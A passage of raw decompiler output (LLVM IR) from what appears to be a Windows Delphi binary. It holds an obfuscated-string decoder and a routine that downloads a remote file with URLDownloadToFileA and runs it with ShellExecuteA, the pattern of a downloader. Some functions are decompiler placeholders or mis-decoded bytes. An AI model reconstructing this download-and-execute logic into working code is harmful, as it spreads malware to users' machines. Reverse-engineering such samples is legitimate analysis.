}

define i32 @function_406518() local_unnamed_addr {
dec_label_pc_406518:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096d4, align 4, !insn.addr !1437
  %2 = add i32 %1, -1, !insn.addr !1437
  store i32 %2, i32* @global_var_4096d4, align 4, !insn.addr !1437
  ret i32 %0, !insn.addr !1438
}

define i32 @function_406520() local_unnamed_addr {
dec_label_pc_406520:
  %eax.0.reg2mem = alloca i32, !insn.addr !1439
  %0 = call i32 @function_406594(), !insn.addr !1440
  %1 = load i32, i32* @global_var_40812c, align 4
  %2 = icmp eq i32 %1, 0, !insn.addr !1441
  store i32 0, i32* %eax.0.reg2mem, !insn.addr !1442
  br i1 %2, label %dec_label_pc_406554, label %dec_label_pc_406532, !insn.addr !1442

dec_label_pc_406532:                              ; preds = %dec_label_pc_406520
  %3 = load i32, i32* inttoptr (i32 4227412 to i32*), align 4, !insn.addr !1443
  %4 = inttoptr i32 %3 to i32*, !insn.addr !1444
  %5 = load i32, i32* %4, align 4, !insn.addr !1444
  %6 = icmp eq i32 %5, 0, !insn.addr !1444
  store i32 %3, i32* %eax.0.reg2mem, !insn.addr !1445
  br i1 %6, label %dec_label_pc_406554, label %dec_label_pc_40653c, !insn.addr !1445

dec_label_pc_40653c:                              ; preds = %dec_label_pc_406532
  call void @PostQuitMessage(i32 66), !insn.addr !1446
  %7 = call i32 @function_404400(i32 66), !insn.addr !1447
  unreachable, !insn.addr !1447

dec_label_pc_406554:                              ; preds = %dec_label_pc_406532, %dec_label_pc_406520
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !1448
}

define i32 @function_406564() local_unnamed_addr {
dec_label_pc_406564:
  %0 = load i32, i32* @global_var_408110, align 4, !insn.addr !1449
  %1 = icmp eq i32 %0, 0, !insn.addr !1449
  br i1 %1, label %dec_label_pc_406572, label %dec_label_pc_40656d, !insn.addr !1450

dec_label_pc_40656d:                              ; preds = %dec_label_pc_406564
  %2 = call i32 @function_406594(), !insn.addr !1451
  br label %dec_label_pc_406572, !insn.addr !1451

dec_label_pc_406572:                              ; preds = %dec_label_pc_40656d, %dec_label_pc_406564
  %3 = load i32, i32* inttoptr (i32 4227400 to i32*), align 8, !insn.addr !1452
  %4 = inttoptr i32 %3 to i32*, !insn.addr !1453
  %5 = load i32, i32* %4, align 4, !insn.addr !1453
  %6 = mul i32 %5, 1000, !insn.addr !1453
  %7 = call i32 @SetTimer(i32* inttoptr (i32 4220192 to i32*), i32 %6, i32 0, void (i32*, i32, i32, i32)* null), !insn.addr !1454
  store i32 %7, i32* @global_var_408110, align 4, !insn.addr !1455
  ret i32 %7, !insn.addr !1456
}

define i32 @function_406594() local_unnamed_addr {
dec_label_pc_406594:
  %.reg2mem = alloca i32, !insn.addr !1457
  %0 = load i32, i32* @global_var_408110, align 4, !insn.addr !1457
  %1 = icmp eq i32 %0, 0, !insn.addr !1457
  store i32 %0, i32* %.reg2mem, !insn.addr !1458
  br i1 %1, label %2, label %dec_label_pc_40659d, !insn.addr !1458

; <label>:2:                                      ; preds = %dec_label_pc_406594
  %3 = call i32 @function_4065b1(), !insn.addr !1458
  %.pre = load i32, i32* @global_var_408110, align 4
  store i32 %.pre, i32* %.reg2mem, !insn.addr !1458
  br label %dec_label_pc_40659d, !insn.addr !1458

dec_label_pc_40659d:                              ; preds = %2, %dec_label_pc_406594
  %.reload = load i32, i32* %.reg2mem, !insn.addr !1459
  ret i32 %.reload, !insn.addr !1460
}

define i32 @function_4065b1() local_unnamed_addr {
dec_label_pc_4065b1:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1461
}

define i32 @function_4065b4() local_unnamed_addr {
dec_label_pc_4065b4:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @function_4064d8(i32 %0), !insn.addr !1462
  ret i32 %1, !insn.addr !1463
}

define i32 @function_4065c0() local_unnamed_addr {
dec_label_pc_4065c0:
  %0 = load i32, i32* @global_var_408114, align 4, !insn.addr !1464
  %1 = icmp eq i32 %0, 0, !insn.addr !1464
  br i1 %1, label %dec_label_pc_4065ce, label %dec_label_pc_4065c9, !insn.addr !1465

dec_label_pc_4065c9:                              ; preds = %dec_label_pc_4065c0
  %2 = call i32 @function_4065e8(), !insn.addr !1466
  br label %dec_label_pc_4065ce, !insn.addr !1466

dec_label_pc_4065ce:                              ; preds = %dec_label_pc_4065c9, %dec_label_pc_4065c0
  %3 = call i32 @SetTimer(i32* inttoptr (i32 4220340 to i32*), i32 5266, i32 0, void (i32*, i32, i32, i32)* null), !insn.addr !1467
  store i32 %3, i32* @global_var_408114, align 4, !insn.addr !1468
  ret i32 %3, !insn.addr !1469
}

define i32 @function_4065e8() local_unnamed_addr {
dec_label_pc_4065e8:
  %0 = load i32, i32* @global_var_408114, align 4, !insn.addr !1470
  ret i32 %0, !insn.addr !1471
}

define i32 @function_406608() local_unnamed_addr {
dec_label_pc_406608:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1472
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1472
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1472
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1473
  %2 = load i32, i32* @global_var_4096d8, align 4, !insn.addr !1474
  %3 = add i32 %2, 1, !insn.addr !1474
  store i32 %3, i32* @global_var_4096d8, align 4, !insn.addr !1474
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1475
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !1476
  ret i32 0, !insn.addr !1477
}

define i32 @function_40662d() local_unnamed_addr {
dec_label_pc_40662d:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1478
  ret i32 %0, !insn.addr !1478
}

define i32 @function_406632() local_unnamed_addr {
dec_label_pc_406632:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1479
}

define i32 @function_406634(i32 %arg1) local_unnamed_addr {
dec_label_pc_406634:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1480
}

define i32 @function_406638() local_unnamed_addr {
dec_label_pc_406638:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096d8, align 4, !insn.addr !1481
  %2 = add i32 %1, -1, !insn.addr !1481
  store i32 %2, i32* @global_var_4096d8, align 4, !insn.addr !1481
  ret i32 %0, !insn.addr !1482
}

define i32 @function_406640() local_unnamed_addr {
dec_label_pc_406640:
  %0 = call i32 @URLDownloadToFileA.11(), !insn.addr !1483
  ret i32 %0, !insn.addr !1483
}

define i32 @function_406648() local_unnamed_addr {
dec_label_pc_406648:
  %esi.0.reg2mem = alloca i32, !insn.addr !1484
  %ebx.0.reg2mem = alloca i32, !insn.addr !1484
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-32 = alloca i32, align 4
  %1 = call i32 @function_4036e4(), !insn.addr !1485
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !1486
  store i32 %2, i32* %stack_var_-32, align 4, !insn.addr !1486
  %3 = ptrtoint i32* %stack_var_-32 to i32, !insn.addr !1486
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !1487
  %4 = call i32 @function_4034f4(), !insn.addr !1488
  %5 = call i32 @"@LStrSetLength"(), !insn.addr !1489
  %6 = call i32 @function_4034f4(), !insn.addr !1490
  %7 = icmp slt i32 %6, 1
  store i32 1, i32* %ebx.0.reg2mem, !insn.addr !1491
  store i32 %6, i32* %esi.0.reg2mem, !insn.addr !1491
  br i1 %7, label %dec_label_pc_4066be, label %dec_label_pc_40668e, !insn.addr !1491

dec_label_pc_40668e:                              ; preds = %dec_label_pc_406648, %dec_label_pc_4066ba
  %esi.0.reload = load i32, i32* %esi.0.reg2mem
  %ebx.0.reload = load i32, i32* %ebx.0.reg2mem
  %8 = add i32 %ebx.0.reload, -1
  %9 = add i32 %8, %0, !insn.addr !1492
  %10 = inttoptr i32 %9 to i8*, !insn.addr !1492
  %11 = load i8, i8* %10, align 1, !insn.addr !1492
  %12 = icmp eq i8 %11, 61, !insn.addr !1492
  %13 = icmp eq i1 %12, false, !insn.addr !1493
  %14 = call i32 @function_40374c()
  br i1 %13, label %dec_label_pc_4066a6, label %dec_label_pc_406698, !insn.addr !1493

dec_label_pc_406698:                              ; preds = %dec_label_pc_40668e
  %15 = add i32 %14, %8, !insn.addr !1494
  %16 = inttoptr i32 %15 to i8*, !insn.addr !1494
  store i8 46, i8* %16, align 1, !insn.addr !1494
  br label %dec_label_pc_4066ba, !insn.addr !1495

dec_label_pc_4066a6:                              ; preds = %dec_label_pc_40668e
  %17 = load i8, i8* %10, align 1, !insn.addr !1496
  %18 = add i8 %17, -1, !insn.addr !1497
  %19 = add i32 %14, %8, !insn.addr !1498
  %20 = inttoptr i32 %19 to i8*, !insn.addr !1498
  store i8 %18, i8* %20, align 1, !insn.addr !1498
  br label %dec_label_pc_4066ba, !insn.addr !1498

dec_label_pc_4066ba:                              ; preds = %dec_label_pc_4066a6, %dec_label_pc_406698
  %21 = add i32 %ebx.0.reload, 1, !insn.addr !1499
  %22 = add i32 %esi.0.reload, -1, !insn.addr !1500
  %23 = icmp eq i32 %22, 0, !insn.addr !1500
  %24 = icmp eq i1 %23, false, !insn.addr !1501
  store i32 %21, i32* %ebx.0.reg2mem, !insn.addr !1501
  store i32 %22, i32* %esi.0.reg2mem, !insn.addr !1501
  br i1 %24, label %dec_label_pc_40668e, label %dec_label_pc_4066be, !insn.addr !1501

dec_label_pc_4066be:                              ; preds = %dec_label_pc_4066ba, %dec_label_pc_406648
  %25 = load i32, i32* %stack_var_-32, align 4, !insn.addr !1502
  call void @__writefsdword(i32 0, i32 %25), !insn.addr !1503
  %26 = call i32 @"@LStrClr"(), !insn.addr !1504
  ret i32 %26, !insn.addr !1505
}

define i32 @function_4066d4() local_unnamed_addr {
dec_label_pc_4066d4:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1506
  ret i32 %0, !insn.addr !1506
}

define i32 @function_4066d9() local_unnamed_addr {
dec_label_pc_4066d9:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1507
}

define i32 @function_4066db(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_4066db:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1508
}

define i32 @function_4066e4() local_unnamed_addr {
dec_label_pc_4066e4:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @"@Str0Long"(i32 %1, i32 %0), !insn.addr !1509
  %3 = call i32 @"@PStrNCpy"(), !insn.addr !1510
  %4 = call i32 @"@LStrFromString"(), !insn.addr !1511
  ret i32 %4, !insn.addr !1512
}

define i32 @function_40671c() local_unnamed_addr {
dec_label_pc_40671c:
  %ecx.0.reg2mem = alloca i32, !insn.addr !1513
  %esp.0.reg2mem = alloca i32, !insn.addr !1513
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %0 = ptrtoint i32* %stack_var_-4 to i32, !insn.addr !1513
  store i32 %0, i32* %esp.0.reg2mem, !insn.addr !1514
  store i32 5, i32* %ecx.0.reg2mem, !insn.addr !1514
  br label %dec_label_pc_406724, !insn.addr !1514

dec_label_pc_406724:                              ; preds = %dec_label_pc_406724, %dec_label_pc_40671c
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %1 = add i32 %esp.0.reload, -4, !insn.addr !1515
  %2 = inttoptr i32 %1 to i32*, !insn.addr !1515
  store i32 0, i32* %2, align 4, !insn.addr !1515
  %3 = add i32 %esp.0.reload, -8, !insn.addr !1516
  %4 = inttoptr i32 %3 to i32*, !insn.addr !1516
  store i32 0, i32* %4, align 4, !insn.addr !1516
  %5 = add nsw i32 %ecx.0.reload, -1, !insn.addr !1517
  %6 = icmp eq i32 %5, 0, !insn.addr !1517
  %7 = icmp eq i1 %6, false, !insn.addr !1518
  store i32 %3, i32* %esp.0.reg2mem, !insn.addr !1518
  store i32 %5, i32* %ecx.0.reg2mem, !insn.addr !1518
  br i1 %7, label %dec_label_pc_406724, label %dec_label_pc_40672b, !insn.addr !1518

dec_label_pc_40672b:                              ; preds = %dec_label_pc_406724
  %8 = add i32 %esp.0.reload, -12, !insn.addr !1519
  %9 = inttoptr i32 %8 to i32*, !insn.addr !1519
  store i32 0, i32* %9, align 4, !insn.addr !1519
  %10 = add i32 %esp.0.reload, -16, !insn.addr !1520
  %11 = inttoptr i32 %10 to i32*, !insn.addr !1520
  %12 = add i32 %esp.0.reload, -20, !insn.addr !1521
  %13 = inttoptr i32 %12 to i32*, !insn.addr !1521
  store i32 %0, i32* %13, align 4, !insn.addr !1521
  %14 = add i32 %esp.0.reload, -24, !insn.addr !1522
  %15 = inttoptr i32 %14 to i32*, !insn.addr !1522
  store i32 4221027, i32* %15, align 4, !insn.addr !1522
  %16 = call i32 @__readfsdword(i32 0), !insn.addr !1523
  %17 = add i32 %esp.0.reload, -28, !insn.addr !1523
  %18 = inttoptr i32 %17 to i32*, !insn.addr !1523
  store i32 %16, i32* %18, align 4, !insn.addr !1523
  call void @__writefsdword(i32 0, i32 %17), !insn.addr !1524
  %19 = call i32 @"@LStrFromPChar"(), !insn.addr !1525
  %20 = call i32 @function_406648(), !insn.addr !1526
  %21 = call i32 @function_4036f4(), !insn.addr !1527
  %22 = call i32 @"@LStrFromPChar"(), !insn.addr !1528
  %23 = add i32 %esp.0.reload, -32, !insn.addr !1529
  %24 = inttoptr i32 %23 to i32*, !insn.addr !1529
  %25 = ptrtoint i32* %stack_var_-12 to i32, !insn.addr !1529
  store i32 %25, i32* %24, align 4, !insn.addr !1529
  %26 = call i32 @"@LStrCopy"(), !insn.addr !1530
  %27 = call i32 @"@LStrDelete"(), !insn.addr !1531
  %28 = add i32 %esp.0.reload, -36, !insn.addr !1532
  %29 = inttoptr i32 %28 to i32*, !insn.addr !1532
  %30 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1532
  store i32 %30, i32* %29, align 4, !insn.addr !1532
  %31 = call i32 @function_4034f4(), !insn.addr !1533
  %32 = call i32 @"@LStrCopy"(), !insn.addr !1534
  %33 = add i32 %esp.0.reload, -40, !insn.addr !1535
  %34 = inttoptr i32 %33 to i32*, !insn.addr !1535
  store i32 ptrtoint ([6 x i8]* @global_var_406878 to i32), i32* %34, align 4, !insn.addr !1535
  %35 = call i32 @function_4066e4(), !insn.addr !1536
  %36 = add i32 %esp.0.reload, -44, !insn.addr !1537
  %37 = inttoptr i32 %36 to i32*, !insn.addr !1537
  %38 = add i32 %esp.0.reload, -48, !insn.addr !1538
  %39 = inttoptr i32 %38 to i32*, !insn.addr !1538
  store i32 ptrtoint (i32* @global_var_406888 to i32), i32* %39, align 4, !insn.addr !1538
  %40 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1539
  %41 = add i32 %esp.0.reload, -52, !insn.addr !1539
  %42 = inttoptr i32 %41 to i32*, !insn.addr !1539
  store i32 %40, i32* %42, align 4, !insn.addr !1539
  %43 = call i32 @"@LStrCatN"(), !insn.addr !1540
  %44 = add i32 %esp.0.reload, -56, !insn.addr !1541
  %45 = inttoptr i32 %44 to i32*, !insn.addr !1541
  store i32 0, i32* %45, align 4, !insn.addr !1541
  %46 = add i32 %esp.0.reload, -60, !insn.addr !1542
  %47 = inttoptr i32 %46 to i32*, !insn.addr !1542
  store i32 0, i32* %47, align 4, !insn.addr !1542
  %48 = call i32 @"@LStrCat3"(), !insn.addr !1543
  %49 = call i32 @function_4036f4(), !insn.addr !1544
  %50 = add i32 %esp.0.reload, -64, !insn.addr !1545
  %51 = inttoptr i32 %50 to i32*, !insn.addr !1545
  store i32 %49, i32* %51, align 4, !insn.addr !1545
  %52 = call i32 @"@LStrFromPChar"(), !insn.addr !1546
  %53 = call i32 @function_406648(), !insn.addr !1547
  %54 = call i32 @function_4036f4(), !insn.addr !1548
  %55 = add i32 %esp.0.reload, -68, !insn.addr !1549
  %56 = inttoptr i32 %55 to i32*, !insn.addr !1549
  store i32 %54, i32* %56, align 4, !insn.addr !1549
  %57 = add i32 %esp.0.reload, -72, !insn.addr !1550
  %58 = inttoptr i32 %57 to i32*, !insn.addr !1550
  store i32 0, i32* %58, align 4, !insn.addr !1550
  %59 = call i32 @function_406640(), !insn.addr !1551
  %60 = add i32 %esp.0.reload, -76, !insn.addr !1552
  %61 = inttoptr i32 %60 to i32*, !insn.addr !1552
  store i32 1, i32* %61, align 4, !insn.addr !1552
  %62 = add i32 %esp.0.reload, -80, !insn.addr !1553
  %63 = inttoptr i32 %62 to i32*, !insn.addr !1553
  store i32 0, i32* %63, align 4, !insn.addr !1553
  %64 = add i32 %esp.0.reload, -84, !insn.addr !1554
  %65 = inttoptr i32 %64 to i32*, !insn.addr !1554
  store i32 0, i32* %65, align 4, !insn.addr !1554
  %66 = call i32 @"@LStrCat3"(), !insn.addr !1555
  %67 = call i32 @function_4036f4(), !insn.addr !1556
  %68 = add i32 %esp.0.reload, -88, !insn.addr !1557
  %69 = inttoptr i32 %68 to i32*, !insn.addr !1557
  store i32 %67, i32* %69, align 4, !insn.addr !1557
  %70 = add i32 %esp.0.reload, -92, !insn.addr !1558
  %71 = inttoptr i32 %70 to i32*, !insn.addr !1558
  store i32 ptrtoint ([5 x i8]* @global_var_406898 to i32), i32* %71, align 4, !insn.addr !1558
  %72 = add i32 %esp.0.reload, -96, !insn.addr !1559
  %73 = inttoptr i32 %72 to i32*, !insn.addr !1559
  store i32 0, i32* %73, align 4, !insn.addr !1559
  %74 = call i32* @ShellExecuteA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1560
  %75 = load i32, i32* %73, align 4, !insn.addr !1561
  call void @__writefsdword(i32 0, i32 %75), !insn.addr !1562
  store i32 4221034, i32* %69, align 4, !insn.addr !1563
  %76 = call i32 @"@LStrArrayClr"(), !insn.addr !1564
  ret i32 %76, !insn.addr !1565
}

define i32 @function_406863() local_unnamed_addr {
dec_label_pc_406863:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1566
  ret i32 %0, !insn.addr !1566
}

define i32 @function_406868() local_unnamed_addr {
dec_label_pc_406868:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1567
}

define i32 @function_40686a(i32 %arg1) local_unnamed_addr {
dec_label_pc_40686a:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1568
}

define i32 @function_40688f(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_40688f:
  %esp.1.reg2mem = alloca i32, !insn.addr !1569
  %.pre-phi.reg2mem = alloca i32*, !insn.addr !1569
  %ecx.0.reg2mem = alloca i32, !insn.addr !1569
  %esp.0.reg2mem = alloca i32, !insn.addr !1569
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %4 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_0, align 4
  %5 = add i32 %2, 1, !insn.addr !1569
  %6 = inttoptr i32 %2 to i32*, !insn.addr !1569
  store i32 %5, i32* %6, align 4, !insn.addr !1569
  %7 = bitcast i32* %eax to i8*
  %8 = load i8, i8* %7, align 4, !insn.addr !1570
  %9 = load i32, i32* %eax, align 4
  %10 = trunc i32 %9 to i8, !insn.addr !1570
  %11 = add i8 %8, %10, !insn.addr !1570
  %12 = inttoptr i32 %9 to i8*, !insn.addr !1570
  store i8 %11, i8* %12, align 1, !insn.addr !1570
  %13 = add i32 %2, 58, !insn.addr !1571
  %14 = inttoptr i32 %13 to i8*, !insn.addr !1571
  %15 = load i8, i8* %14, align 1, !insn.addr !1571
  %16 = load i32, i32* %eax, align 4, !insn.addr !1571
  %17 = udiv i32 %16, 256, !insn.addr !1571
  %18 = trunc i32 %17 to i8, !insn.addr !1571
  %19 = add i8 %15, %18, !insn.addr !1571
  store i8 %19, i8* %14, align 1, !insn.addr !1571
  %20 = add i32 %0, 112, !insn.addr !1572
  %21 = inttoptr i32 %20 to i8*, !insn.addr !1572
  %22 = load i8, i8* %21, align 1, !insn.addr !1572
  %23 = trunc i32 %4 to i8, !insn.addr !1572
  %24 = add i8 %22, %23, !insn.addr !1572
  store i8 %24, i8* %21, align 1, !insn.addr !1572
  %25 = trunc i32 %3 to i16, !insn.addr !1573
  %26 = call i8 @__readgsbyte(i32 %1), !insn.addr !1573
  call void @__asm_outsb(i16 %25, i8 %26), !insn.addr !1573
  %27 = load i8, i8* %7, align 4, !insn.addr !1574
  %28 = load i32, i32* %eax, align 4
  %29 = trunc i32 %28 to i8, !insn.addr !1574
  %30 = add i8 %27, %29, !insn.addr !1574
  %31 = inttoptr i32 %28 to i8*, !insn.addr !1574
  store i8 %30, i8* %31, align 1, !insn.addr !1574
  %32 = load i8, i8* %7, align 4, !insn.addr !1575
  %33 = load i32, i32* %eax, align 4
  %34 = trunc i32 %33 to i8, !insn.addr !1575
  %35 = add i8 %32, %34, !insn.addr !1575
  %36 = inttoptr i32 %33 to i8*, !insn.addr !1575
  store i8 %35, i8* %36, align 1, !insn.addr !1575
  %37 = ptrtoint i32* %stack_var_0 to i32, !insn.addr !1576
  store i32 %37, i32* %esp.0.reg2mem, !insn.addr !1577
  store i32 13, i32* %ecx.0.reg2mem, !insn.addr !1577
  br label %dec_label_pc_4068a8, !insn.addr !1577

dec_label_pc_4068a8:                              ; preds = %dec_label_pc_4068a8, %dec_label_pc_40688f
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %38 = add i32 %esp.0.reload, -4, !insn.addr !1578
  %39 = inttoptr i32 %38 to i32*, !insn.addr !1578
  store i32 0, i32* %39, align 4, !insn.addr !1578
  %40 = add i32 %esp.0.reload, -8, !insn.addr !1579
  %41 = inttoptr i32 %40 to i32*, !insn.addr !1579
  store i32 0, i32* %41, align 4, !insn.addr !1579
  %42 = add nsw i32 %ecx.0.reload, -1, !insn.addr !1580
  %43 = icmp eq i32 %42, 0, !insn.addr !1580
  %44 = icmp eq i1 %43, false, !insn.addr !1581
  store i32 %40, i32* %esp.0.reg2mem, !insn.addr !1581
  store i32 %42, i32* %ecx.0.reg2mem, !insn.addr !1581
  br i1 %44, label %dec_label_pc_4068a8, label %dec_label_pc_4068af, !insn.addr !1581

dec_label_pc_4068af:                              ; preds = %dec_label_pc_4068a8
  %45 = add i32 %esp.0.reload, -12, !insn.addr !1582
  %46 = inttoptr i32 %45 to i32*, !insn.addr !1582
  store i32 0, i32* %46, align 4, !insn.addr !1582
  %47 = add i32 %esp.0.reload, -20, !insn.addr !1583
  %48 = inttoptr i32 %47 to i32*, !insn.addr !1583
  store i32 %37, i32* %48, align 4, !insn.addr !1583
  %49 = add i32 %esp.0.reload, -24, !insn.addr !1584
  %50 = inttoptr i32 %49 to i32*, !insn.addr !1584
  store i32 4221764, i32* %50, align 4, !insn.addr !1584
  %51 = call i32 @__readfsdword(i32 0), !insn.addr !1585
  %52 = add i32 %esp.0.reload, -28, !insn.addr !1585
  %53 = inttoptr i32 %52 to i32*, !insn.addr !1585
  store i32 %51, i32* %53, align 4, !insn.addr !1585
  call void @__writefsdword(i32 0, i32 %52), !insn.addr !1586
  %54 = call i32 @"@LStrPos"(), !insn.addr !1587
  %55 = add i32 %esp.0.reload, -32, !insn.addr !1588
  %56 = inttoptr i32 %55 to i32*, !insn.addr !1588
  %57 = ptrtoint i32* %stack_var_-4 to i32, !insn.addr !1588
  store i32 %57, i32* %56, align 4, !insn.addr !1588
  %58 = call i32 @"@LStrCopy"(), !insn.addr !1589
  %59 = add i32 %esp.0.reload, -36, !insn.addr !1590
  %60 = inttoptr i32 %59 to i32*
  %61 = ptrtoint i32* %stack_var_-8 to i32, !insn.addr !1590
  store i32 %61, i32* %60, align 4, !insn.addr !1590
  %62 = call i32 @function_4034f4(), !insn.addr !1591
  %63 = call i32 @"@LStrCopy"(), !insn.addr !1592
  %64 = add i32 %arg1, -1, !insn.addr !1593
  store i32 %64, i32* %eax, align 4, !insn.addr !1593
  store i32* %60, i32** %.pre-phi.reg2mem
  store i32 %59, i32* %esp.1.reg2mem
  switch i32 %arg1, label %dec_label_pc_406b29 [
    i32 0, label %dec_label_pc_406921
    i32 1, label %dec_label_pc_406a61
    i32 2, label %dec_label_pc_406acf
  ]

dec_label_pc_406921:                              ; preds = %dec_label_pc_4068af
  %65 = call i32 @function_4034f4(), !insn.addr !1594
  %66 = icmp slt i32 %65, 5, !insn.addr !1595
  store i32* %60, i32** %.pre-phi.reg2mem, !insn.addr !1595
  store i32 %59, i32* %esp.1.reg2mem, !insn.addr !1595
  br i1 %66, label %dec_label_pc_406b29, label %dec_label_pc_406932, !insn.addr !1595

dec_label_pc_406932:                              ; preds = %dec_label_pc_406921
  %67 = call i32 @"@LStrFromPChar"(), !insn.addr !1596
  %68 = call i32 @function_406648(), !insn.addr !1597
  %69 = add i32 %esp.0.reload, -40, !insn.addr !1598
  %70 = inttoptr i32 %69 to i32*, !insn.addr !1598
  %71 = call i32 @"@LStrFromPChar"(), !insn.addr !1599
  %72 = call i32 @function_406648(), !insn.addr !1600
  %73 = add i32 %esp.0.reload, -44, !insn.addr !1601
  %74 = inttoptr i32 %73 to i32*, !insn.addr !1601
  %75 = load i32, i32* %stack_var_-4, align 4, !insn.addr !1602
  %76 = add i32 %esp.0.reload, -48, !insn.addr !1602
  %77 = inttoptr i32 %76 to i32*, !insn.addr !1602
  store i32 %75, i32* %77, align 4, !insn.addr !1602
  %78 = add i32 %esp.0.reload, -52, !insn.addr !1603
  %79 = inttoptr i32 %78 to i32*, !insn.addr !1603
  store i32 ptrtoint (i32* @global_var_406b68 to i32), i32* %79, align 4, !insn.addr !1603
  %80 = load i32, i32* %stack_var_-8, align 4, !insn.addr !1604
  %81 = add i32 %esp.0.reload, -56, !insn.addr !1604
  %82 = inttoptr i32 %81 to i32*, !insn.addr !1604
  store i32 %80, i32* %82, align 4, !insn.addr !1604
  %83 = call i32 @"@LStrCatN"(), !insn.addr !1605
  %84 = add i32 %esp.0.reload, -60, !insn.addr !1606
  %85 = inttoptr i32 %84 to i32*, !insn.addr !1606
  %86 = add i32 %esp.0.reload, -64, !insn.addr !1607
  %87 = inttoptr i32 %86 to i32*, !insn.addr !1607
  store i32 4221812, i32* %87, align 4, !insn.addr !1607
  %88 = load i32, i32* %stack_var_-4, align 4, !insn.addr !1608
  %89 = add i32 %esp.0.reload, -68, !insn.addr !1608
  %90 = inttoptr i32 %89 to i32*, !insn.addr !1608
  store i32 %88, i32* %90, align 4, !insn.addr !1608
  %91 = add i32 %esp.0.reload, -72, !insn.addr !1609
  %92 = inttoptr i32 %91 to i32*, !insn.addr !1609
  store i32 4221828, i32* %92, align 4, !insn.addr !1609
  %93 = load i32, i32* %stack_var_-8, align 4, !insn.addr !1610
  %94 = add i32 %esp.0.reload, -76, !insn.addr !1610
  %95 = inttoptr i32 %94 to i32*, !insn.addr !1610
  store i32 %93, i32* %95, align 4, !insn.addr !1610
  %96 = add i32 %esp.0.reload, -80, !insn.addr !1611
  %97 = inttoptr i32 %96 to i32*, !insn.addr !1611
  store i32 4221844, i32* %97, align 4, !insn.addr !1611
  %98 = call i32 @function_4079ec(), !insn.addr !1612
  %99 = add i32 %esp.0.reload, -84, !insn.addr !1613
  %100 = inttoptr i32 %99 to i32*, !insn.addr !1613
  %101 = call i32 @"@LStrCatN"(), !insn.addr !1614
  %102 = add i32 %esp.0.reload, -88, !insn.addr !1615
  %103 = inttoptr i32 %102 to i32*, !insn.addr !1615
  %104 = add i32 %esp.0.reload, -92, !insn.addr !1616
  %105 = inttoptr i32 %104 to i32*
  %106 = ptrtoint i32* %stack_var_-40 to i32, !insn.addr !1616
  store i32 %106, i32* %105, align 4, !insn.addr !1616
  %107 = call i32 @"@LStrFromPChar"(), !insn.addr !1617
  %108 = call i32 @function_406648(), !insn.addr !1618
  %109 = call i32 @"@LStrPos"(), !insn.addr !1619
  %110 = add i32 %109, -1, !insn.addr !1620
  %111 = add i32 %esp.0.reload, -96, !insn.addr !1621
  %112 = inttoptr i32 %111 to i32*, !insn.addr !1621
  store i32 %110, i32* %112, align 4, !insn.addr !1621
  %113 = call i32 @"@LStrFromPChar"(), !insn.addr !1622
  %114 = call i32 @function_406648(), !insn.addr !1623
  %115 = call i32 @"@LStrCopy"(), !insn.addr !1624
  %116 = load i32, i32* %stack_var_-40, align 4, !insn.addr !1625
  store i32 %116, i32* %112, align 4, !insn.addr !1626
  %117 = call i32 @"@LStrFromPChar"(), !insn.addr !1627
  %118 = call i32 @function_406648(), !insn.addr !1628
  %119 = add i32 %esp.0.reload, -100, !insn.addr !1629
  %120 = inttoptr i32 %119 to i32*, !insn.addr !1629
  %121 = call i32 @"@LStrFromPChar"(), !insn.addr !1630
  %122 = call i32 @function_406648(), !insn.addr !1631
